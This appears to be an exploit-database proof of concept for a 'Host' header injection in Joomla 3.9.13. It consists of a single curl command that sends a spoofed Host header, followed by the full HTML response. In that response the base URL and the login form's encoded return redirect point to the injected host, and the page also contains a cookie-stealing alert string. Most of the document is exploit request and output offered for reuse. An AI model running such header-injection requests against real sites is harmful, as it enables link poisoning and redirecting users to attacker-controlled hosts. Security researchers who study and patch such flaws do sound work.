@@ -1,0 +1,237 @@
+# Exploit Title: Joomla 3.9.13 - 'Host' Header Injection
+# Author: Pablo Santiago
+# Date: 2019-11-12
+# Vendor Homepage: https://www.joomla.org/
+# Source: https://downloads.joomla.org/cms/joomla3/3-9-13/Joomla_3-9-13-Stable-Full_Package.zip?format=zip
+# Version: 3.9.13
+# CVE : N/A
+# Tested on: Windows 10
+
+#PoC
+
+curl http://localhost/joomla/ -H "Host: exploit-db.com"
+
+<!DOCTYPE html>
+<html lang="en-gb" dir="ltr">
+<head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta charset="utf-8" />
+        <base href="http://exploit-db.com/joomla/" />
+        <meta name="description" content="javacript:alert(document.cookie)" />
+        <meta name="generator" content="Joomla! - Open Source Content
+Management" />
+        <title>Home</title>
+        <link href="/joomla/index.php?format=feed&type=rss"
+rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+        <link href="/joomla/index.php?format=feed&type=atom"
+rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+        <link href="/joomla/templates/protostar/favicon.ico"
+rel="shortcut icon" type="image/vnd.microsoft.icon" />
+        <link href="/joomla/templates/protostar/css/template.css?190197408a83fd286a9c42640a0f2f22"
+rel="stylesheet" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans"
+rel="stylesheet" />
+        <style>
+
+        h1, h2, h3, h4, h5, h6, .site-title {
+                font-family: 'Open Sans', sans-serif;
+        }
+        </style>
+        <script type="application/json" class="joomla-script-options
+new">{"csrf.token":"d460ac322fbbb6ae67cc78034182d9e1","system.paths":{"root":"\/joomla","base":"\/joomla"},"system.keepalive":{"interval":840000,"uri":"\/joomla\/index.php\/component\/ajax\/?format=json"}}</script>
+        <script
+src="/joomla/media/jui/js/jquery.min.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script
+src="/joomla/media/jui/js/jquery-noconflict.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script
+src="/joomla/media/jui/js/jquery-migrate.min.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script
+src="/joomla/media/system/js/caption.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script
+src="/joomla/media/jui/js/bootstrap.min.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script
+src="/joomla/templates/protostar/js/template.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <!--[if lt IE 9]><script
+src="/joomla/media/jui/js/html5.js?190197408a83fd286a9c42640a0f2f22"></script><![endif]-->
+        <script
+src="/joomla/media/system/js/core.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <!--[if lt IE 9]><script
+src="/joomla/media/system/js/polyfill.event.js?190197408a83fd286a9c42640a0f2f22"></script><![endif]-->
+        <script
+src="/joomla/media/system/js/keepalive.js?190197408a83fd286a9c42640a0f2f22"></script>
+        <script>
+jQuery(window).on('load',  function() {
+                                new JCaption('img.caption');
+jQuery(function($){ initTooltips(); $("body").on("subform-row-add",
+initTooltips); function initTooltips (event, container) { container =
+container || document;$(container).find(".hasTooltip").tooltip({"html":
+true,"container": "body"});} });
+        </script>
+
+</head>
+<body class="site com_content view-featured no-layout no-task itemid-101">
+        <!-- Body -->
+        <div class="body" id="top">
+                <div class="container">
+                        <!-- Header -->
+                        <header class="header" role="banner">
+                                <div class="header-inner clearfix">
+                                        <a class="brand pull-left"
+href="/joomla/">
+                                                <span
+class="site-title"
+title="javacript:alert(document.cookie)">javacript:alert(document.cookie)</span>
+
+          </a>
+                                        <div class="header-search pull-right">
+
+                                        </div>
+                                </div>
+                        </header>
+
+                        <div class="row-fluid">
+                                                                <main
+id="content" role="main" class="span9">
+                                        <!-- Begin Content -->
+
+                                        <div id="system-message-container">
+        </div>
+
+                                        <div class="blog-featured"
+itemscope itemtype="https://schema.org/Blog">
+<div class="page-header">
+        <h1>
+        Home    </h1>
+</div>
+
+
+
+</div>
+
+                                        <div class="clearfix"></div>
+                                        <div aria-label="breadcrumbs"
+role="navigation">
+        <ul itemscope itemtype="https://schema.org/BreadcrumbList"
+class="breadcrumb">
+                                        <li>
+                                You are here: &#160;
+                        </li>
+
+                                                <li
+itemprop="itemListElement" itemscope
+itemtype="https://schema.org/ListItem" class="active">
+                                        <span itemprop="name">
+                                                Home
+                 </span>
+                                        <meta itemprop="position" content="1">
+                                </li>
+                                </ul>
+</div>
+
+                                        <!-- End Content -->
+                                </main>
+
+ <div id="aside" class="span3">
+                                                <!-- Begin Right Sidebar -->
+                                                <div class="well
+_menu"><h3 class="page-header">Main Menu</h3><ul class="nav menu
+mod-list">
+<li class="item-101 default current active"><a
+href="/joomla/index.php" >Home</a></li></ul>
+</div><div class="well "><h3 class="page-header">Login Form</h3><form
+action="/joomla/index.php" method="post" id="login-form"
+class="form-inline">
+                <div class="userdata">
+                <div id="form-login-username" class="control-group">
+                        <div class="controls">
+
+ <div class="input-prepend">
+                                                <span class="add-on">
+                                                        <span
+class="icon-user hasTooltip" title="Username"></span>
+                                                        <label
+for="modlgn-username" class="element-invisible">Username</label>
+                                                </span>
+                                                <input
+id="modlgn-username" type="text" name="username" class="input-small"
+tabindex="0" size="18" placeholder="Username" />
+                                        </div>
+                                                        </div>
+                </div>
+                <div id="form-login-password" class="control-group">
+                        <div class="controls">
+
+ <div class="input-prepend">
+                                                <span class="add-on">
+                                                        <span
+class="icon-lock hasTooltip" title="Password">
+                                                        </span>
+                                                                <label
+for="modlgn-passwd" class="element-invisible">Password
+                             </label>
+                                                </span>
+                                                <input
+id="modlgn-passwd" type="password" name="password" class="input-small"
+tabindex="0" size="18" placeholder="Password" />
+                                        </div>
+                                                        </div>
+                </div>
+                                                <div
+id="form-login-remember" class="control-group checkbox">
+                        <label for="modlgn-remember"
+class="control-label">Remember Me</label> <input id="modlgn-remember"
+type="checkbox" name="remember" class="inputbox" value="yes"/>
+                </div>
+                                <div id="form-login-submit"
+class="control-group">
+                        <div class="controls">
+                                <button type="submit" tabindex="0"
+name="Submit" class="btn btn-primary login-button">Log in</button>
+                        </div>
+                </div>
+                                        <ul class="unstyled">
+                                                        <li>
+                                        <a
+href="/joomla/index.php/component/users/?view=remind&Itemid=101">
+                                        Forgot your username?</a>
+                                </li>
+                                <li>
+                                        <a
+href="/joomla/index.php/component/users/?view=reset&Itemid=101">
+                                        Forgot your password?</a>
+                                </li>
+                        </ul>
+                <input type="hidden" name="option" value="com_users" />
+                <input type="hidden" name="task" value="user.login" />
+                <input type="hidden" name="return"
+value="aHR0cDovL2V4cGxvaXQtZGIuY29tL2pvb21sYS8=" />
+                <input type="hidden"
+name="d460ac322fbbb6ae67cc78034182d9e1" value="1" />       </div>
+        </form>
+</div>
+                                                <!-- End Right Sidebar -->
+                                        </div>
+                                                        </div>
+                </div>
+        </div>
+        <!-- Footer -->
+        <footer class="footer" role="contentinfo">
+                <div class="container">
+                        <hr />
+
+                        <p class="pull-right">
+                                <a href="#top" id="back-top">
+                                        Back to Top
+         </a>
+                        </p>
+                        <p>
+                                &copy; 2019
+javacript:alert(document.cookie)                    </p>
+                </div>
+        </footer>
+
+</body>
+</html>
+
+#PoC Visual
+https://imgur.com/a/IgO4ZxI
